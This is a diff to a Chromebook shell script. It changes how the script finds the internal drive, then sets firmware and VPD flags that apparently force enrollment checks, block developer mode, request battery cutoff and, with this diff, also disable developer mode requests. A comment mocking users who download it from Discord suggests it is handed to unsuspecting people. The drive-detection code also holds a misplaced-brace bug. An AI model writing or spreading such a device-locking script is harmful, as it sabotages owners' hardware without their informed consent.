@@ -5,25 +5,38 @@ fail() {
     exit 1
 }
 
-get_largest_cros_blockdev() {
-    local largest size dev_name tmp_size remo
-    size=0
-    for blockdev in /sys/block/*; do
-        dev_name="${blockdev##*/}"
-        echo "$dev_name" | grep -q '^\(loop\|ram\)' && continue
-        tmp_size=$(cat "$blockdev"/size)
-        remo=$(cat "$blockdev"/removable)
-        if [ "$tmp_size" -gt "$size" ] && [ "${remo:-0}" -eq 0 ]; then
-            case "$(sfdisk -d "/dev/$dev_name" 2>/dev/null)" in
-                *'name="STATE"'*'name="KERN-A"'*'name="ROOT-A"'*)
-                    largest="/dev/$dev_name"
-                    size="$tmp_size"
-                    ;;
-            esac
-        fi
-    done
-    echo "$largest"
+
+get_fixed_dst_drive() {
+	local dev
+	if [ -z "${DEFAULT_ROOTDEV}" ]; then
+		for dev in /sys/block/sd* /sys/block/mmcblk*; do
+			if [ ! -d "${dev}" ] || [ "$(cat "${dev}/removable")" = 1 ] || [ "$(cat "${dev}/size")" -lt 2097152 ]; then
+				continue
+			fi
+			if [ -f "${dev}/device/type" ]; then
+				case "$(cat "${dev}/device/type")" in
+				SD*)
+					continue;
+					;;
+				esac
+			fi
+			DEFAULT_ROOTDEV="{$dev}"
+		done
+	fi
+	if [ -z "${DEFAULT_ROOTDEV}" ]; then
+		dev=""
+	else
+		dev="/dev/$(basename ${DEFAULT_ROOTDEV})"
+		if [ ! -b "${dev}" ]; then
+			dev=""
+		fi
+	fi
+	echo "${dev}"
 }
+
+. /usr/sbin/write_gpt.sh
+load_base_vars
+CROS_DEV=$(get_fixed_dst_drive)
 
 format_part_number() {
     echo -n "$1"
@@ -31,7 +44,6 @@ format_part_number() {
     echo "$2"
 }
 
-CROS_DEV="$(get_largest_cros_blockdev)"
 [ -z "$CROS_DEV" ] && fail "No CrOS SSD found on device!"
 
 echo "no name yet."
@@ -46,12 +58,13 @@ case "$action" in
     *) fail "Abort." ;;
 esac
 
-# if youre reading this then good job, Youre not a skid. 
+# if you are reading this then good job, you are not a skid. else you are downloading this off discord and pressed view full file.  In that case you are still a skid. 
 
 crossystem battery_cutoff_request=1
 vpd -i RW_VPD -s check_enrollment=1
 vpd -i RW_VPD -s block_devmode=1
 crossystem block_devmode=1
+crossystem disable_dev_request=1
 
 sleep 2
 
